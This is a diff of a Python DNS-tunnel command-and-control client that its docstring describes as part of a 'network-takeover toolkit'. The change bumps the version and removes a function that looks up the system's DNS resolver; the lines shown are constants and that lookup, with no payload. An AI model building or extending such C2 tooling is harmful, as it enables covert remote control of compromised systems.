@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# v1.3
+# v1.4
 """
 dns_c2.py — DNS tunnel C2 client for the network-takeover toolkit.
 
@@ -21,7 +21,6 @@ The server side lives in scapy/dns tunnel/dns_tunnel_server.py.
 
 import base64
 import os
-import platform
 import random
 import re
 import socket
@@ -42,37 +41,6 @@ CHUNK_SIZE = 50
 QUERY_DELAY = 0.3
 HANDSHAKE_TIMEOUT = 15
 COMMAND_POLL_INTERVAL = 60
-
-
-# ── System DNS discovery ───────────────────────────────────────────────────────
-
-def get_system_dns() -> str:
-    """Return the system's first configured DNS resolver, or 8.8.8.8."""
-    candidates = []
-    if platform.system() == "Windows":
-        try:
-            out = subprocess.check_output(
-                ["netsh", "interface", "ip", "show", "dns"],
-                stderr=subprocess.DEVNULL, text=True, timeout=5,
-            )
-            for line in out.splitlines():
-                if re.search(r"DNS", line, re.IGNORECASE):
-                    m = re.search(r"(\d{1,3}(?:\.\d{1,3}){3})", line)
-                    if m:
-                        candidates.append(m.group(1))
-        except Exception:
-            pass
-    else:
-        try:
-            with open("/etc/resolv.conf") as fh:
-                for line in fh:
-                    if line.startswith("nameserver"):
-                        parts = line.split()
-                        if len(parts) >= 2:
-                            candidates.append(parts[1])
-        except Exception:
-            pass
-    return candidates[0] if candidates else "8.8.8.8"
 
 
 # ── Encoding helpers ───────────────────────────────────────────────────────────
